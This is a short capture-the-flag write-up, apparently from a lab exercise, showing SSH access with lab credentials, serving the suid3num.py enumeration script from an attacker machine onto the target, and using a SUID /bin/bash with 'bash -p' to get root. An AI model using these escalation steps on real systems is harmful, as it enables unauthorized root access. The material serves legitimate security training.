ssh to the server using `cmnatic:aoc2020`. I will use `suid3num.py` to enumerate suid. I start by checking if the target server have wget and python3 pre-installed. python3 is used when execute `suid3num.py` and wget is use for get `suid3num.py` from our kali
```console
-bash-4.4$ which python3
/usr/bin/python3
-bash-4.4$ which wget
/usr/bin/wget
```
now on kali, run python http server module
```console
$ python3 -m http.server --cgi 8888
```
on target server, use wget to download `suid3num.py`. and run it
```console
-bash-4.4$ python3 suid3num.py 
[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/bin/bash -~> https://gtfobins.github.io/gtfobins/bash/#suid
------------------------------


[$] Please try the command(s) below to exploit harmless SUID bin(s) found !!!
------------------------------
[~] /bin/bash -p
------------------------------
```
now run `/bin/bash -p` to gain root
```console
-bash-4.4$ /bin/bash -p
bash-4.4# whoami
root
```